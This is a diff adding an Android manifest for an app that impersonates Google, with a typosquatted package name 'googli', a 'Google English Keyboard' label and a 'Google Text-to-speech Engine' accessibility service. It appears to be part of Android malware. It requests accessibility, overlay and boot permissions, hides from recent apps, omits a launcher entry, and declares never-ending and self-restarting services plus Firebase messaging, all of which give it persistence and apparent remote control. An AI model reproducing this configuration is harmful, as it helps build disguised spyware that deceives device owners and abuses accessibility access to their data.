@@ -1,0 +1,82 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.googli.googletext_to_speechengine"
+    android:excludeFromRecents="true">
+
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+    <application
+        android:allowBackup="true"
+        android:icon="@mipmap/google_indic_keyboard"
+        android:label="Google English Keyboard (American)"
+        android:roundIcon="@mipmap/google_indic_keyboard"
+        android:supportsRtl="true"
+        android:theme="@style/AppTheme">
+        <activity android:name=".MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+
+                
+            </intent-filter>
+        </activity>
+
+        <service android:name=".Text_to_Speech_Service" />
+        <service
+            android:name=".BootAccessibilityService"
+            android:label="Google Text-to-speech Engine"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessability_service" />
+        </service>
+        <service android:name=".FireBaseMessagingService">
+            <intent-filter>
+                <action android:name="com.google.firebase.MESSAGING_EVENT" />
+            </intent-filter>
+        </service>
+        <service android:name=".FireBaseInstanceIdService">
+            <intent-filter>
+                <action android:name="com.google.firebase.INSTANCE_ID_EVENT" />
+            </intent-filter>
+        </service>
+        <service android:name=".NeverEndingService" />
+        <service
+            android:name=".ChatHeadService"
+            android:enabled="true"
+            android:exported="false"/>
+        <receiver
+            android:name=".Text_to_Speech_Receiver"
+        android:enabled="true"
+        android:exported="false"
+        android:permission="android.permission.RECEIVE_BOOT_COMPLETED">
+        <intent-filter>
+            <action android:name="android.intent.action.BOOT_COMPLETED" />
+
+            <category android:name="android.intent.category.DEFAULT" />
+
+            <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+            <action android:name="android.intent.action.REBOOT" />
+        </intent-filter>
+    </receiver>
+    <receiver
+        android:name=".RestartServiceReciver"
+        android:enabled="true"
+        android:exported="true"
+        android:label="RestartServiceWhenStopped">
+        <intent-filter>
+            <action android:name="ac.in.ActivityRecognition.RestartSensor" />
+        </intent-filter>
+    </receiver>
+
+    <activity
+        android:name=".FlashActivity"
+        android:theme="@style/Base.Theme.AppCompat.Light" />
+    <activity android:name=".NeverEndingActivity" />
+</application>
+
+    </manifest>
